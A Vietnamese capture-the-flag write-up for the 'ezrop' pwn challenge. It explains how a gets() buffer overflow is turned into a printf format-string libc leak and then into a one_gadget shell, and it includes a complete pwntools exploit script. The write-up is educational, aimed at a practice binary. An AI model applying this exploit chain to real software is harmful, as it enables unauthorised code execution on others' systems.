# ezrop
- 1 chall thật sự hay và mình khá bất ngờ vs cách giải nó

## ida

- main

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ignore_me(argc, argv, envp);
  return vuln();
}
```
- vuln

```c 
__int64 vuln()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("Enter your name: ");
  return gets(v1);
}
```

## Analysis
- nhìn thì có vẻ đơn giản nhỉ, nma check ROPgadget thì ko có pop rdi, chỉ có pop rbp thôi
- hmm khả năng cao là ta sẽ giải bằng FSOP, nma ở đây ko có puts mà chỉ có printf, khá khó khăn đây
- theo như mình đoán thì FSOP hàm puts vs hàm printf sẽ giống nhau, nma cách này khá khó khăn nên mình chuyển hướng khác
- debug chậm lại hàm printf để xem điều thú vị

![image](https://github.com/gookoosss/CTF/assets/128712571/02cce8e3-f551-4f42-85ce-b99bacafdc73)

![image](https://github.com/gookoosss/CTF/assets/128712571/ff65cf9c-a8c9-41c7-b62b-4193e0291a1f)


- như ta đã thấy thì printf sẽ in ra data mà con trỏ rdi trỏ đến , mà rdi được set bằng rax (mov rdi, rax)
- hmm nếu vậy thì khi ta thay đổi thằng rax thì cũng sẽ thay đổi rdi
- hàm gets sẽ lưu data nhập vào lên rax, , lợi dụng điều này ta có thể có FMT ở hàm printf sau

## Exploit
- đầu tiên ta dùng BOF để chạy lại hàm vuln, nma ta sẽ vào vuln+19 để rax ko thay đổi khi ta gets
- lúc này ta nhớ set rbp thành rw_section

![image](https://github.com/gookoosss/CTF/assets/128712571/9c2528b9-7809-4e38-89a3-60cf18e51d64)


- bây giờ ta có thể leak được libc bằng FMT
- có được libc rồi thì dùng one_gadget để lấy shell thôi, nhớ set rbp nha

![image](https://github.com/gookoosss/CTF/assets/128712571/e19971e9-d851-4d07-ad1a-b2567de4fea2)


## Script 
```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./ezrop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process([exe.path])
gdb.attach(p, gdbscript = '''
b*0x00000000004011f6
b*0x0000000000401207
b*0x40120c
c
''')

input()

# p = remote('challenge19.play.potluckctf.com', 31337)
rw_section = 0x404400

payload = b'%9$p'
payload = payload.ljust(32)
payload += p64(rw_section)
payload += p64(exe.sym.vuln + 19)

p.sendline(payload)
p.recvuntil(b'Enter your name: ')
leak_libc = int(p.recv(14), 16)
libc.address = leak_libc - 0x29d90
print(hex(libc.address))
pop_rbp = 0x40115D

# pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
# rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
# rop = b"".join([p64(i) for i in rop])
# payload = b'a'*32 + p64(rw_section) + rop 

payload = flat(
    [
        b"\x00"*0x28,
        pop_rbp,
        rw_section,
        libc.address + 0xebcf1, # one gadget
    ]
)

p.sendline(payload)


p.interactive()

```
